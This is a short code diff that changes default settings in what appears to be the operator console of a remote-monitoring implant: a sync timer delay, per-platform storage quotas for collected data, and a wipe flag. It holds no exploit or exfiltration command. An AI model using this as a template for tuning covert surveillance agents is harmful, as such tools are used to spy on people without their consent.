@@ -15,7 +15,7 @@ package it.ht.rcs.console
       
       var config:Object = {};
       config.modules = getModules();
-      config.events  = [{desc: "SYNC", event: "timer", repeat: 0, delay: 20}];
+      config.events  = [{desc: "SYNC", event: "timer", repeat: 0, delay: 60}];
       config.actions = [{desc: "SYNC", subactions: [{action: "synchronize"}]}];
       config.globals = getGlobals();
       
@@ -169,11 +169,12 @@ package it.ht.rcs.console
     
     private static function getGlobals():Object
     {
-      
+      var min:Number = agent.platform == 'desktop' ? 1000000000 : 100000000; // 1 GB, 100 MB
+      var max:Number = agent.platform == 'desktop' ? 1000000000 : 100000000; // 1 GB, 100 MB
       var globals:Object = {
-                             quota: { "min": 524288000, "max": 1048576000 },
+                             quota: { "min": min, "max": max },
                              wipe: false,
-                             type: agent ? agent.type : '',
+                             type: agent.type,
                              advanced: false
                            };
       
